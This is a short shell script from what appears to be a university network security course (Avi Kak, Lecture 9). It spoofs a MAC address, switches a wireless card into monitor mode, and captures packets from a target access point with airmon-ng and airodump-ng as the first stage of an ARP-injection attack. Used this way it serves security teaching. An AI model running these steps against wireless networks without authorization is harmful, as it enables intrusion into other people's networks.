#!/bin/sh

#  start_monitoring.sh
#
#  by Avi Kak (kak@purdue.edu)

##  The following three shell scripts:
##
##      start_monitoring.sh             (this file)
##
##      inject_arp.sh
##
##      restore.sh
##
##
##  are meant to be used only if your version of Ubuntu is
##  older than 13.10.  If your version of Ubuntu is more
##  recent than that, you need to use the shell script
##
##      StartMonitorModeInterface.sh
##
##  Read the Lecture 9 notes on how to use this script.


#  Run this is a separate window and wait for the last command shown
#  to start collecting the packets and dumping them in the file
#  specified with the '-w' option.

#  After you have collected sufficient packets, kill the script
#  with ctrl-C.

#  Note that xx:xx:xx:xx:xx:xx is the MAC address of the Access Point
#  you want to attack and yy the channel it is using.

rm -f mydumpfile* replay_arp*
sleep 5
service network-manager stop
sleep 5
ifconfig wlan0 down
sleep 5
macchanger --mac 00:11:22:33:44:55 wlan0
sleep 5
airmon-ng start wlan0 6
sleep 5
airodump-ng -c yy -w mydumpfile --bssid xx:xx:xx:xx:xx:xx  wlan0


